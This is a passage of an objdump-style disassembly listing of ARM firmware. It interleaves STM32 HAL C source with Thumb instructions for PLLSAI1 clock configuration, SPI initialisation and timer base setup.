 8004c00:	7bfb      	ldrb	r3, [r7, #15]
 8004c02:	2b00      	cmp	r3, #0
 8004c04:	d15f      	bne.n	8004cc6 <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004c06:	683b      	ldr	r3, [r7, #0]
 8004c08:	2b00      	cmp	r3, #0
 8004c0a:	d110      	bne.n	8004c2e <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004c0c:	4b30      	ldr	r3, [pc, #192]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c0e:	691b      	ldr	r3, [r3, #16]
 8004c10:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004c14:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004c18:	687a      	ldr	r2, [r7, #4]
 8004c1a:	6892      	ldr	r2, [r2, #8]
 8004c1c:	0211      	lsls	r1, r2, #8
 8004c1e:	687a      	ldr	r2, [r7, #4]
 8004c20:	68d2      	ldr	r2, [r2, #12]
 8004c22:	06d2      	lsls	r2, r2, #27
 8004c24:	430a      	orrs	r2, r1
 8004c26:	492a      	ldr	r1, [pc, #168]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c28:	4313      	orrs	r3, r2
 8004c2a:	610b      	str	r3, [r1, #16]
 8004c2c:	e027      	b.n	8004c7e <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004c2e:	683b      	ldr	r3, [r7, #0]
 8004c30:	2b01      	cmp	r3, #1
 8004c32:	d112      	bne.n	8004c5a <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004c34:	4b26      	ldr	r3, [pc, #152]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c36:	691b      	ldr	r3, [r3, #16]
 8004c38:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004c3c:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004c40:	687a      	ldr	r2, [r7, #4]
 8004c42:	6892      	ldr	r2, [r2, #8]
 8004c44:	0211      	lsls	r1, r2, #8
 8004c46:	687a      	ldr	r2, [r7, #4]
 8004c48:	6912      	ldr	r2, [r2, #16]
 8004c4a:	0852      	lsrs	r2, r2, #1
 8004c4c:	3a01      	subs	r2, #1
 8004c4e:	0552      	lsls	r2, r2, #21
 8004c50:	430a      	orrs	r2, r1
 8004c52:	491f      	ldr	r1, [pc, #124]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c54:	4313      	orrs	r3, r2
 8004c56:	610b      	str	r3, [r1, #16]
 8004c58:	e011      	b.n	8004c7e <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004c5a:	4b1d      	ldr	r3, [pc, #116]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c5c:	691b      	ldr	r3, [r3, #16]
 8004c5e:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004c62:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004c66:	687a      	ldr	r2, [r7, #4]
 8004c68:	6892      	ldr	r2, [r2, #8]
 8004c6a:	0211      	lsls	r1, r2, #8
 8004c6c:	687a      	ldr	r2, [r7, #4]
 8004c6e:	6952      	ldr	r2, [r2, #20]
 8004c70:	0852      	lsrs	r2, r2, #1
 8004c72:	3a01      	subs	r2, #1
 8004c74:	0652      	lsls	r2, r2, #25
 8004c76:	430a      	orrs	r2, r1
 8004c78:	4915      	ldr	r1, [pc, #84]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c7a:	4313      	orrs	r3, r2
 8004c7c:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004c7e:	4b14      	ldr	r3, [pc, #80]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c80:	681b      	ldr	r3, [r3, #0]
 8004c82:	4a13      	ldr	r2, [pc, #76]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c84:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004c88:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004c8a:	f7fc fb6f 	bl	800136c <HAL_GetTick>
 8004c8e:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004c90:	e009      	b.n	8004ca6 <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004c92:	f7fc fb6b 	bl	800136c <HAL_GetTick>
 8004c96:	4602      	mov	r2, r0
 8004c98:	68bb      	ldr	r3, [r7, #8]
 8004c9a:	1ad3      	subs	r3, r2, r3
 8004c9c:	2b02      	cmp	r3, #2
 8004c9e:	d902      	bls.n	8004ca6 <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004ca0:	2303      	movs	r3, #3
 8004ca2:	73fb      	strb	r3, [r7, #15]
          break;
 8004ca4:	e005      	b.n	8004cb2 <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004ca6:	4b0a      	ldr	r3, [pc, #40]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ca8:	681b      	ldr	r3, [r3, #0]
 8004caa:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004cae:	2b00      	cmp	r3, #0
 8004cb0:	d0ef      	beq.n	8004c92 <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004cb2:	7bfb      	ldrb	r3, [r7, #15]
 8004cb4:	2b00      	cmp	r3, #0
 8004cb6:	d106      	bne.n	8004cc6 <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004cb8:	4b05      	ldr	r3, [pc, #20]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cba:	691a      	ldr	r2, [r3, #16]
 8004cbc:	687b      	ldr	r3, [r7, #4]
 8004cbe:	699b      	ldr	r3, [r3, #24]
 8004cc0:	4903      	ldr	r1, [pc, #12]	; (8004cd0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cc2:	4313      	orrs	r3, r2
 8004cc4:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004cc6:	7bfb      	ldrb	r3, [r7, #15]
}
 8004cc8:	4618      	mov	r0, r3
 8004cca:	3710      	adds	r7, #16
 8004ccc:	46bd      	mov	sp, r7
 8004cce:	bd80      	pop	{r7, pc}
 8004cd0:	40021000 	.word	0x40021000

08004cd4 <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004cd4:	b580      	push	{r7, lr}
 8004cd6:	b084      	sub	sp, #16
 8004cd8:	af00      	add	r7, sp, #0
 8004cda:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004cdc:	687b      	ldr	r3, [r7, #4]
 8004cde:	2b00      	cmp	r3, #0
 8004ce0:	d101      	bne.n	8004ce6 <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004ce2:	2301      	movs	r3, #1
 8004ce4:	e095      	b.n	8004e12 <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004ce6:	687b      	ldr	r3, [r7, #4]
 8004ce8:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004cea:	2b00      	cmp	r3, #0
 8004cec:	d108      	bne.n	8004d00 <HAL_SPI_Init+0x2c>
  {
    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004cee:	687b      	ldr	r3, [r7, #4]
 8004cf0:	685b      	ldr	r3, [r3, #4]
 8004cf2:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004cf6:	d009      	beq.n	8004d0c <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004cf8:	687b      	ldr	r3, [r7, #4]
 8004cfa:	2200      	movs	r2, #0
 8004cfc:	61da      	str	r2, [r3, #28]
 8004cfe:	e005      	b.n	8004d0c <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004d00:	687b      	ldr	r3, [r7, #4]
 8004d02:	2200      	movs	r2, #0
 8004d04:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004d06:	687b      	ldr	r3, [r7, #4]
 8004d08:	2200      	movs	r2, #0
 8004d0a:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004d0c:	687b      	ldr	r3, [r7, #4]
 8004d0e:	2200      	movs	r2, #0
 8004d10:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004d12:	687b      	ldr	r3, [r7, #4]
 8004d14:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004d18:	b2db      	uxtb	r3, r3
 8004d1a:	2b00      	cmp	r3, #0
 8004d1c:	d106      	bne.n	8004d2c <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004d1e:	687b      	ldr	r3, [r7, #4]
 8004d20:	2200      	movs	r2, #0
 8004d22:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004d26:	6878      	ldr	r0, [r7, #4]
 8004d28:	f7fc f8cc 	bl	8000ec4 <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004d2c:	687b      	ldr	r3, [r7, #4]
 8004d2e:	2202      	movs	r2, #2
 8004d30:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004d34:	687b      	ldr	r3, [r7, #4]
 8004d36:	681b      	ldr	r3, [r3, #0]
 8004d38:	681a      	ldr	r2, [r3, #0]
 8004d3a:	687b      	ldr	r3, [r7, #4]
 8004d3c:	681b      	ldr	r3, [r3, #0]
 8004d3e:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004d42:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004d44:	687b      	ldr	r3, [r7, #4]
 8004d46:	68db      	ldr	r3, [r3, #12]
 8004d48:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004d4c:	d902      	bls.n	8004d54 <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004d4e:	2300      	movs	r3, #0
 8004d50:	60fb      	str	r3, [r7, #12]
 8004d52:	e002      	b.n	8004d5a <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004d54:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004d58:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004d5a:	687b      	ldr	r3, [r7, #4]
 8004d5c:	68db      	ldr	r3, [r3, #12]
 8004d5e:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004d62:	d007      	beq.n	8004d74 <HAL_SPI_Init+0xa0>
 8004d64:	687b      	ldr	r3, [r7, #4]
 8004d66:	68db      	ldr	r3, [r3, #12]
 8004d68:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004d6c:	d002      	beq.n	8004d74 <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004d6e:	687b      	ldr	r3, [r7, #4]
 8004d70:	2200      	movs	r2, #0
 8004d72:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004d74:	687b      	ldr	r3, [r7, #4]
 8004d76:	685b      	ldr	r3, [r3, #4]
 8004d78:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004d7c:	687b      	ldr	r3, [r7, #4]
 8004d7e:	689b      	ldr	r3, [r3, #8]
 8004d80:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004d84:	431a      	orrs	r2, r3
 8004d86:	687b      	ldr	r3, [r7, #4]
 8004d88:	691b      	ldr	r3, [r3, #16]
 8004d8a:	f003 0302 	and.w	r3, r3, #2
 8004d8e:	431a      	orrs	r2, r3
 8004d90:	687b      	ldr	r3, [r7, #4]
 8004d92:	695b      	ldr	r3, [r3, #20]
 8004d94:	f003 0301 	and.w	r3, r3, #1
 8004d98:	431a      	orrs	r2, r3
 8004d9a:	687b      	ldr	r3, [r7, #4]
 8004d9c:	699b      	ldr	r3, [r3, #24]
 8004d9e:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004da2:	431a      	orrs	r2, r3
 8004da4:	687b      	ldr	r3, [r7, #4]
 8004da6:	69db      	ldr	r3, [r3, #28]
 8004da8:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004dac:	431a      	orrs	r2, r3
 8004dae:	687b      	ldr	r3, [r7, #4]
 8004db0:	6a1b      	ldr	r3, [r3, #32]
 8004db2:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004db6:	ea42 0103 	orr.w	r1, r2, r3
 8004dba:	687b      	ldr	r3, [r7, #4]
 8004dbc:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004dbe:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004dc2:	687b      	ldr	r3, [r7, #4]
 8004dc4:	681b      	ldr	r3, [r3, #0]
 8004dc6:	430a      	orrs	r2, r1
 8004dc8:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004dca:	687b      	ldr	r3, [r7, #4]
 8004dcc:	699b      	ldr	r3, [r3, #24]
 8004dce:	0c1b      	lsrs	r3, r3, #16
 8004dd0:	f003 0204 	and.w	r2, r3, #4
 8004dd4:	687b      	ldr	r3, [r7, #4]
 8004dd6:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004dd8:	f003 0310 	and.w	r3, r3, #16
 8004ddc:	431a      	orrs	r2, r3
 8004dde:	687b      	ldr	r3, [r7, #4]
 8004de0:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004de2:	f003 0308 	and.w	r3, r3, #8
 8004de6:	431a      	orrs	r2, r3
 8004de8:	687b      	ldr	r3, [r7, #4]
 8004dea:	68db      	ldr	r3, [r3, #12]
 8004dec:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004df0:	ea42 0103 	orr.w	r1, r2, r3
 8004df4:	68fb      	ldr	r3, [r7, #12]
 8004df6:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004dfa:	687b      	ldr	r3, [r7, #4]
 8004dfc:	681b      	ldr	r3, [r3, #0]
 8004dfe:	430a      	orrs	r2, r1
 8004e00:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004e02:	687b      	ldr	r3, [r7, #4]
 8004e04:	2200      	movs	r2, #0
 8004e06:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004e08:	687b      	ldr	r3, [r7, #4]
 8004e0a:	2201      	movs	r2, #1
 8004e0c:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004e10:	2300      	movs	r3, #0
}
 8004e12:	4618      	mov	r0, r3
 8004e14:	3710      	adds	r7, #16
 8004e16:	46bd      	mov	sp, r7
 8004e18:	bd80      	pop	{r7, pc}

08004e1a <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004e1a:	b580      	push	{r7, lr}
 8004e1c:	b082      	sub	sp, #8
 8004e1e:	af00      	add	r7, sp, #0
 8004e20:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004e22:	687b      	ldr	r3, [r7, #4]
 8004e24:	2b00      	cmp	r3, #0
 8004e26:	d101      	bne.n	8004e2c <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004e28:	2301      	movs	r3, #1
 8004e2a:	e049      	b.n	8004ec0 <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004e2c:	687b      	ldr	r3, [r7, #4]
 8004e2e:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004e32:	b2db      	uxtb	r3, r3
 8004e34:	2b00      	cmp	r3, #0
 8004e36:	d106      	bne.n	8004e46 <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004e38:	687b      	ldr	r3, [r7, #4]
 8004e3a:	2200      	movs	r2, #0
 8004e3c:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004e40:	6878      	ldr	r0, [r7, #4]
 8004e42:	f7fc f943 	bl	80010cc <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004e46:	687b      	ldr	r3, [r7, #4]
 8004e48:	2202      	movs	r2, #2
 8004e4a:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004e4e:	687b      	ldr	r3, [r7, #4]
 8004e50:	681a      	ldr	r2, [r3, #0]
 8004e52:	687b      	ldr	r3, [r7, #4]
 8004e54:	3304      	adds	r3, #4
 8004e56:	4619      	mov	r1, r3
 8004e58:	4610      	mov	r0, r2
 8004e5a:	f000 fa7d 	bl	8005358 <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004e5e:	687b      	ldr	r3, [r7, #4]
 8004e60:	2201      	movs	r2, #1
 8004e62:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004e66:	687b      	ldr	r3, [r7, #4]
 8004e68:	2201      	movs	r2, #1
 8004e6a:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004e6e:	687b      	ldr	r3, [r7, #4]
 8004e70:	2201      	movs	r2, #1
 8004e72:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004e76:	687b      	ldr	r3, [r7, #4]
 8004e78:	2201      	movs	r2, #1
 8004e7a:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004e7e:	687b      	ldr	r3, [r7, #4]
 8004e80:	2201      	movs	r2, #1
 8004e82:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004e86:	687b      	ldr	r3, [r7, #4]
 8004e88:	2201      	movs	r2, #1
 8004e8a:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004e8e:	687b      	ldr	r3, [r7, #4]
 8004e90:	2201      	movs	r2, #1
 8004e92:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004e96:	687b      	ldr	r3, [r7, #4]
 8004e98:	2201      	movs	r2, #1
 8004e9a:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004e9e:	687b      	ldr	r3, [r7, #4]
 8004ea0:	2201      	movs	r2, #1
 8004ea2:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004ea6:	687b      	ldr	r3, [r7, #4]
 8004ea8:	2201      	movs	r2, #1
 8004eaa:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004eae:	687b      	ldr	r3, [r7, #4]
 8004eb0:	2201      	movs	r2, #1
 8004eb2:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004eb6:	687b      	ldr	r3, [r7, #4]
 8004eb8:	2201      	movs	r2, #1
 8004eba:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004ebe:	2300      	movs	r3, #0
}
 8004ec0:	4618      	mov	r0, r3
 8004ec2:	3708      	adds	r7, #8
 8004ec4:	46bd      	mov	sp, r7
 8004ec6:	bd80      	pop	{r7, pc}

08004ec8 <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004ec8:	b480      	push	{r7}
 8004eca:	b085      	sub	sp, #20
 8004ecc:	af00      	add	r7, sp, #0
 8004ece:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004ed0:	687b      	ldr	r3, [r7, #4]
 8004ed2:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004ed6:	b2db      	uxtb	r3, r3
 8004ed8:	2b01      	cmp	r3, #1
 8004eda:	d001      	beq.n	8004ee0 <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004edc:	2301      	movs	r3, #1
 8004ede:	e03b      	b.n	8004f58 <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004ee0:	687b      	ldr	r3, [r7, #4]
 8004ee2:	2202      	movs	r2, #2
 8004ee4:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004ee8:	687b      	ldr	r3, [r7, #4]
 8004eea:	681b      	ldr	r3, [r3, #0]
 8004eec:	68da      	ldr	r2, [r3, #12]
 8004eee:	687b      	ldr	r3, [r7, #4]
 8004ef0:	681b      	ldr	r3, [r3, #0]
 8004ef2:	f042 0201 	orr.w	r2, r2, #1
 8004ef6:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004ef8:	687b      	ldr	r3, [r7, #4]
 8004efa:	681b      	ldr	r3, [r3, #0]
 8004efc:	4a19      	ldr	r2, [pc, #100]	; (8004f64 <HAL_TIM_Base_Start_IT+0x9c>)
 8004efe:	4293      	cmp	r3, r2
 8004f00:	d009      	beq.n	8004f16 <HAL_TIM_Base_Start_IT+0x4e>
 8004f02:	687b      	ldr	r3, [r7, #4]
 8004f04:	681b      	ldr	r3, [r3, #0]
 8004f06:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004f0a:	d004      	beq.n	8004f16 <HAL_TIM_Base_Start_IT+0x4e>
 8004f0c:	687b      	ldr	r3, [r7, #4]
 8004f0e:	681b      	ldr	r3, [r3, #0]
 8004f10:	4a15      	ldr	r2, [pc, #84]	; (8004f68 <HAL_TIM_Base_Start_IT+0xa0>)
 8004f12:	4293      	cmp	r3, r2
 8004f14:	d115      	bne.n	8004f42 <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004f16:	687b      	ldr	r3, [r7, #4]
 8004f18:	681b      	ldr	r3, [r3, #0]
 8004f1a:	689a      	ldr	r2, [r3, #8]
 8004f1c:	4b13      	ldr	r3, [pc, #76]	; (8004f6c <HAL_TIM_Base_Start_IT+0xa4>)
 8004f1e:	4013      	ands	r3, r2
 8004f20:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004f22:	68fb      	ldr	r3, [r7, #12]
 8004f24:	2b06      	cmp	r3, #6
 8004f26:	d015      	beq.n	8004f54 <HAL_TIM_Base_Start_IT+0x8c>
 8004f28:	68fb      	ldr	r3, [r7, #12]
 8004f2a:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004f2e:	d011      	beq.n	8004f54 <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004f30:	687b      	ldr	r3, [r7, #4]
 8004f32:	681b      	ldr	r3, [r3, #0]
 8004f34:	681a      	ldr	r2, [r3, #0]
 8004f36:	687b      	ldr	r3, [r7, #4]
 8004f38:	681b      	ldr	r3, [r3, #0]
 8004f3a:	f042 0201 	orr.w	r2, r2, #1
 8004f3e:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
